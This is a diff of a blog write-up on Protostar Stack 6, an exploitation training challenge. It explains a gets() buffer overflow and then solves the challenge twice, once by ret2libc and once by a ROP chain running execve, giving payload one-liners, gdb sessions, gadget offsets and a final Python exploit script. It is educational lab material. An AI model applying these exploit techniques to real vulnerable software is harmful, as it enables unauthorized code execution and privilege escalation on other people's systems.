@@ -1,63 +1,53 @@
-# Introduction
+# --[ Introduction ]
+
 So here we are again, for some reason I decided to start looking into binary exploitation again. I haven't seen this kinda stuff for a few years, and I guess I kinda missed it. I decided to delve in again with protostar!
 
-I am going to be laying out the thought process that I followed to solve Protostar Stack 6!
+I am going to be laying out the thought process that I followed to solve Protostar Stack 6! This post will look at solving stack6 with a ret2libc attack, and a future one using ROP. Let's do it!
 
-# The Challenge
+# --[ The Challenge ]
 
 So the challenge is pretty straightforward in terms of finding out what we have to do, and we're left with finding out how to do it. In particular, the vulnerable code is in this function:
 
 ```c
- 6 void getpath()
- 7 {
+ 6 void getpath() {
  8  char buffer[64];
  9  unsigned int ret;
-10
 11  printf("input path please: "); fflush(stdout);
 12
 13  gets(buffer);
 14
 15  ret = __builtin_return_address(0);
-16
 17  if((ret & 0xbf000000) == 0xbf000000) {
 18    printf("bzzzt (%p)\n", ret);
 19    _exit(1);
 20  }
-21
 22  printf("got path %s\n", buffer);
 23 }
 ```
 
 Why is this vulnerable?! From `man gets`
 
-``` .....
-The gets() function is equivalent to fgets() with an infinite size and a stream of stdin, except that the newline character (if any) is not stored in the string.  It is the caller's responsibility to ensure that the input line, if any, is sufficiently short to fit in the string
-.....
-```
+> gets() is equivalent to fgets() with an infinite size and a stream of stdin [...] It is the caller's responsibility to ensure that the input line, if any, is sufficiently short to fit in the string
 
 In other words, `gets` will keep reading until it encounters a newline with no bounds checking of any kind (also mentioned in the security notes of the man-page). This in turn is good news for us, however looking at line 17 we see a strange check. 
 
-The check at line 17 is making sure that the return address of the `getpath` function does not start with `0xbf`. What's so special about addresses beginning with `0xbf`, I hear you ask. It turns out that addresses beggning with `0xbffff` are part of the stack [1][2], so really this code is making sure to enforce an NX (non-executable) stack, so we can't just godd-'ol point EIP to our buffer and execute any shellcode we want from the stack.
+The check at line 17 is making sure that the return address of `getpath` does not start with `0xbf`. What's so special about addresses beginning with `0xbf`, I hear you ask. It turns out that addresses beggning with `0xbffff` are part of the stack [1][2], so really this check is trying to enforce a NX (non-executable) stack, so we can't just good-'ol point EIP to our buffer and execute any shellcode we want from the stack.
 
-# NX-stack Exploitation
+# --[ NX-stack ]
 
-## General Methodology 
+What exactly is an NX-Stack and why would the stack be NX ?! It is a binary exploitation mitigation, introduced to counter stack-based buffer overflows [3], along with stack canaries[4]. The general idea is that by marking the stack as Readable, Writeable and Non-Executable the processor is prevented from executing instructions from the stack (and hence potentially malicious input). In contrast, memory regions that contain code and are marked as Read-Only and Executable to avoid modification.
 
-What exactly is an NX-Stack and why would the stack be NX ?! It is a binary exploitation mitigation, introduced to counter stack-based buffer overflows [3], along with stack canaries[4]. The general idea is that by marking the stack as Readable, Writeable and Non-Executable the processor is prevented from executing instructions from the stack (and hence potentially malicious input). In contrast, memory regions that contain code and are marked as Read-Only and Executable in an effort to ensure code integrity and thus add a security layer.
+So now the game is somewhat harder, we need to defeat the NX-stack. There are two ways to do this, and I did both just to check that I could. The first way is by returning to a libc function of choice, and the broader category is known as ret2libc attacks. When this is not possible, you can result to crafting a Return-Oriented Programming (ROP) payload, but this is considerably harder and more time consuming. Both of these techniques assume that ASLR [5] is not enabled (and from now on we will assume it to be true for the rest of the article). 
 
-So now the game is somewhat harder, we need to defeat the NX-stack. There are two ways to do this, and I did both just to check that I could. The first way is by returning to a libc function of choice, and the broader category is known as ret2libc attacks. When this is not possible, you can result to crafting a Return-Oriented Programming (ROP) payload, but this is considerably harder and more time consuming.
+# --[ Exploitation Setup ]
 
-Both of these techniques assume that ASLR [5] is not enabled (and from now on we will assume it to be true for the rest of the article).
+To make things easier for us, we need to do three things:
 
-## Exploitation
-### Setup 
+* enable coredumps: `$ ulimit -c unlimited`.
+* enable SUID coredumps: `# echo 2 >/proc/sys/fs/suid_dumpable`.
+* find a debugging instruction in the binary.
 
-To make things easier for us, we need to do two things:
-* enable coredumps -> `$ ulimit -c unlimited`
-* enable coredumps for SUID binaries -> `# echo 2 >/proc/sys/fs/suid_dumpable`
-* find a debugging instruction -> `0xCC`
-
-These will allow us to inspect the process as it crashes or hits a breakpoint, allowing us to verify our logic step by step. Debugger interrupt is `int 3` or `0xCC`, and we can look for one using `objdump`:
+These will allow us to inspect the process when it crashes or hits a breakpoint, allowing us to verify our logic step by step. Debugger interrupt is `int 3` or `0xCC`, and we can look for one using `objdump`:
 
 ```
 $ objdump -s ./stack6 | grep -e cc
@@ -67,23 +57,13 @@ $ objdump -s ./stack6 | grep -e cc
 
 Bingo, we were lucky found a break point on `0x0804824c`. Conveniently, this is in the `.text` section of the binary, so we should be able to call it without issues. 
 
-Now we need to make our binary crash, and by trying a few different offsets we find that `80` bytes of padding are enough for the next `4` bytes to overwrite EIP:
+Now we need to make our binary crash, and by trying a few different offsets we find that 84 bytes are enough to overwrite EIP. Let's test this with our our breakpoint:
 
-```bash
-$ python -c 'print "A" * 80 + "BBBB"' | ./stack6
-input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
-Segmentation fault (core dumped)
-root@protostar:/opt/protostar/bin# gdb -q ./stack6 /tmp/core.11.stack6.1562 
-Program terminated with signal 11, Segmentation fault.
-#0  0x42424242 in ?? ()
-```
-
-Testing our breakpoint: 
 ```bash
 $ python -c 'print "A" * 80 + "\x4c\x82\x04\x08"' | ./stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAL�
 Trace/breakpoint trap (core dumped)
-root@protostar:/opt/protostar/bin# gdb -q ./stack6 /tmp/core.5.stack6.1566 
+# gdb -q ./stack6 /tmp/core.5.stack6.1566 
 Program terminated with signal 5, Trace/breakpoint trap.
 #0  0x0804824d in ?? ()
 (gdb) x/i $eip-1
@@ -91,6 +71,7 @@ Program terminated with signal 5, Trace/breakpoint trap.
 ```
 
 Another way to find this offset out would be to look at the assembly of the target function:
+
 ```arm
 0x08048484 <getpath+0>:	    push   ebp
 0x08048485 <getpath+1>:	    mov    ebp,esp
@@ -100,7 +81,8 @@ Another way to find this offset out would be to look at the assembly of the targ
 0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
 ```
 
-So we know that the stack exactly before `getpath` is called containes a return address (because of x86 calling conventions) and then we do a `push ebp`, increasing our offset by 4. After this, we see that `gets` (which expects a pointer to our buffer) is passed the address `ebp-0x4c` (`0x4c` is 76 in decimal), which tells us that our buffer starts at `ebp-0x4c`. Putting this together, we can see that our buffer is at `address_of_return_address_on_stack - 4 - 76`, making our total offset 80 bytes from the start of our buffer till we overwrite our return address on the stack. The diagram below shows the points of interest and the stack layout based on the conversation so far: 
+So we know that the stack exactly before `getpath` is called containes a return address (because of x86 calling conventions) and then we do a `push ebp`, increasing our offset from EIP by 4. After this, we see that `gets` (which expects a pointer to our buffer) is passed the address `ebp-0x4c` (`0x4c` is 76 in decimal), which tells us that our buffer starts at `ebp-0x4c`. Putting this together, we can see that our buffer is at `address_of_return_address_on_stack - 4 - 76`, making our total offset 80 bytes from the start of our buffer till we overwrite `getpath`'s return address on the stack. The diagram below shows the points of interest and the stack layout based on the conversation so far: 
+
 ```
  ________________ < ebp - 0x4c
 |  our buffer    |
@@ -116,7 +98,8 @@ So we know that the stack exactly before `getpath` is called containes a return 
 
 We now have a way to debug our logic, know what the memory layout looks like and can reliably trigger the bug!
 
-### Exploitation
+# --[ Exploitation ]
+
 So what actually is a ret2libc attack? This puzzled me for ages, but turns out it is reasonably straightforward. The idea is that basically after you take control of EIP  by means of an stack-based buffer overflow you can redirect the execution flow towards system functions found in libc. This is done by overwriting the return address stored on the stack with the your target function's entrypoint. This is the big picture, but of course there are more details to this and a very handy article to talk about this is [6].
 
 In order to carry out our attack, we need to figure out the following:
@@ -156,7 +139,7 @@ $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
 $2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
 ```
 
-Now for the part that confused me the most. How TF do I find `/bin/sh`? I saw a lot of people do it online by using a secondary program to create a few environment variables, and also the same technique was used in the book The Shellcoder's Handbook. Seeing as I am lazy (and also the thought of having to debug other people's C...), however, I thought it would be useful to do it another way. Since the memory is super predictable, I can just pass in `/bin/sh` as part of the input, find it on the stack, and then pass that address in. Let's try!
+Now for the part that confused me the most: how TF do I find `/bin/sh`? I saw a lot of people do it online by using a secondary program to create a few environment variables, and also the same technique was used in the book The Shellcoder's Handbook. Seeing as I am lazy (and also the thought of having to debug other people's C...), however, I thought it would be useful to do it another way. Since the memory is super predictable, I can just pass in `/bin/sh` as part of the input, find it on the stack, and then pass that address in. Let's try!
 
 So the stack now has to look like:
 ```
@@ -180,18 +163,18 @@ So the stack now has to look like:
 ```
 
 ```bash
-python -c 'print "A" * 80 + "\x4c\x82\x04\x08" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x2f\x62\x69\x6e\x2f\x73\x68"' | ./stack6
-```
-
-Run this and inspecting the coredump, we see:
-```arm
+$ python -c 'print "A" * 80 + "\x4c\x82\x04\x08" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x2f\x62\x69\x6e\x2f\x73\x68"' | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAL�
+Trace/breakpoint trap (core dumped)
+# gdb -q ./stack6 /tmp/core.5.stack6.1799
+Program terminated with signal 5, Trace/breakpoint trap.
 (gdb) x/4x $esp
 0xbffff800:	0x00000000	0x00000000	0x6e69622f	0x0068732f
 (gdb) x/s 0xbffff808
 0xbffff808:	 "/bin/sh"
 ```
 
-And this is where things went wrong for me. Turns out, as described in [1], that gdb will setup some additional environment variables and that will impact the actual offsets of addresses on the stack when you run outside gdb. So whilst in GDB the address is `0xbffff808`, outside gdb it was `0xbffff7f8`. I found that pretty much by hand, by incrementing the pointer to my string by 10 bytes at a time - which was super tedious. Putting all of this together, we have:
+And this is where things went wrong for me. Turns out, as described in [1], that gdb will setup some additional environment variables and that will impact the actual offsets of addresses on the stack when you run outside gdb. So whilst in GDB the address is `0xbffff808`, outside gdb it was `0xbffff7f8`. Putting all of this together, we have:
 
 ```bash
 $ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xf8\xf7\xff\xbf" + "/usr/bin/id"'  | ./stack6
@@ -279,16 +262,16 @@ No surprises there, libc is everpresent! Now we basically just have to find gadg
 
 ### Exploitation
 
-As a first step, I tried to find the exact instructions that I needed but I had no luck. So then we need to find instructions that achieve what we want to do, and then fight their sideeffects if any (spoiler alert again: there were). Keep in mind that we also have the stack available for use, so we can inject any data that we are missing or can't find in memory.
+As a first step, I tried to find the exact instructions that I needed but I had no luck. So then we need to find instructions that achieve what we want to do, and then fight any side-effects (spoiler alert again: there were). Keep in mind that we also have the stack available for use, so we can inject any data that we are missing or can't find in memory, giving us more options with regards to available gadgets.
 
 I am not going to bore you with the exact process, so here's the final ROP chain:
 
 ```arm
-0x1a9e   : pop edx ; ret					                    # setup the stack to contain 0x00 to edx 
-0x3900e  : and al, 8 ; add esp, 0xc ; ret			            # esp skips over our data
+0x1a9e   : pop edx ; ret					                    # setup the stack to contain 0x00 and pop to edx 
+0x3900e  : and al, 8 ; add esp, 0xc ; ret			            # esp skips over our /tmp/sh data on the stack
 0xc24f7  : push esp ; xor eax, eax ; pop ebx ; pop ebp ; ret	# moving esp to ebx
-0x12acce : dec ebx ; ret 					                    # repeated a few times
-0xcaf24  : add ecx, ebx ; ret					                # set ecx = ebx
+0x12acce : dec ebx ; ret 					                    # repeated a few times to get correct ebx value
+0xcaf24  : add ecx, ebx ; ret					                # set ecx = ebx for pointer to NULL
 0x97193  : mov eax, 0xb ; int 0x80 				                # syscall
 ```
 
@@ -323,11 +306,7 @@ For this to work, we need the input (and by proxy the stack) to look like this:
 | 0x97193        | <- mov eax, 0xb ; int 0x80
 ```
 
-This is the final exploit that I can up with:
-
-
-
-Now to find out where it's being loaded, we will need to inspect the processe's process memory maps:
+Right, almost there! The last thing we need to do now is find out where libc is loaded in memory when the binary runs. Notice that the gadget instructions above are *relative* offsets into libc, so to get their absolute address and use them we must compute for each one the value `libc_base + gadget_libc_offset`. We will need to inspect the processe's process memory maps for this:
 
 ```bash
 $ ps aux | grep -e '[s]tack6'
@@ -338,7 +317,7 @@ b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so <-- this
 ....
 ```
 
-So it looks like libc is loaded at base address `0xb7e97000`. 
+So it looks like libc is loaded at base address `0xb7e97000`. Putting all of this together, here's my final exploit:
 
 ```python
 import struct
@@ -355,51 +334,36 @@ padding = "A" * 80
 pop_edx = l(0x1a9e)
 NULL="\x00\x00\x00\x00"
 add_esp_12 = l(0x3900e)
-binsh_str = "/tmp/sh\x00\x00\x00\x00\x00"
+tmpsh_str = "/tmp/sh\x00\x00\x00\x00\x00"
 push_esp = l(0xc24f7)
 dec_ebx = l(0x12acce)
 add_ecx_ebx = l(0xcaf24)
 set_eax_interrupt = l(0x97193)
 
 fmt = "{0}{1}{2}{3}{4}{5}{2}" + "{6}"*9 + "{8}" + "{6}"*7 +"{7}"
-payload = fmt.format(padding, pop_edx, NULL, add_esp_12, binsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip()
+payload = fmt.format(padding, pop_edx, NULL, add_esp_12, tmpsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip()
 sys.stdout.write(payload)
 sys.stdout.flush()
 ```
 
-================ ROP ==============
-
-ROP ?! I think the overal strategy with this is to use ROP to get a syscall going, using sys_execve
-
-for this we need: (https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/)
+Notice above that my target is `/tmp/sh`, not `/bin/sh`. I had problems getting `/bin/sh` to work and get an active session, so instead I compiled my own program and made it verify my shinny new root access :)
 
 
-The first part of the payload will be the same, because it triggers the overflow, and then the stack should look like:
 
-ROP addr1
-ROP addr2
-....
-ROP addrN
-STRING ADDR
-STRING
+# --[ CLOSING THOUGHTS ]
+
+Finally the end! I think writing this post was as long as learning to do the exploit!
+
+Some takeaway lessons that I found the hard way:
+
+* NULL pointer != pointer to NULL; I got bit hard by this one, as a lot of blogs mentioned that ECX could be null so I just set it to NULL. Instead it want's to be a pointer to NULL. 
+* `push _arg_ ; ret ;` instructions are the devil. `ret` will return to whatever we just, so generally these instructions are not the most useful. 
+* gdb will mess you around. Twice for me, once when I was looking for the offsets of my variable in ret2libc and then when I was trying to find out the libc base for my ROP-chain.
+* all bytes are 8 bits, but not all bytes are equal. We were lucky here with exploiting `gets`, but in general we would not be able to freely put NULL bytes into the input.
+* I wasted a lot of time trying to decide between python 2 and 3. God damn.
 
 
-I have a new approach!
-
-0x00001a9e : pop edx ; ret					# setup the stack to contain 0x00000000 to edx 			
-0x0003900e : and al, 8 ; add esp, 0xc ; ret			# modify esp to jump over our /bin/sh\x00DDDD < junk at the end
-0x000c24f7 : push esp ; xor eax, eax ; pop ebx ; pop ebp ; ret	# moving esp to ebx
-0x0012acce : dec ebx ; ret 					# x16 tho, because that's the offset between our string and ebx
-0x000caf24 : add ecx, ebx ; ret					# set ecx = ebx
-0x00097193 : mov eax, 0xb ; int 0x80 				# setup the interrupt
-
-# Closing Thoughts
-* push reg; ret instructions will fuck you up
-* finding where things are loaded in ram can be an ass
-* a debugger will mess you up in weird ways
-* find bad bytes you have to worry about
-* wasting enormous time with poython 2 and 3, what a mess of an ecosystem
-
+# --[ SOURCES ]
 
 [1] - https://stackoverflow.com/a/17775966/1366384
 [2] - https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
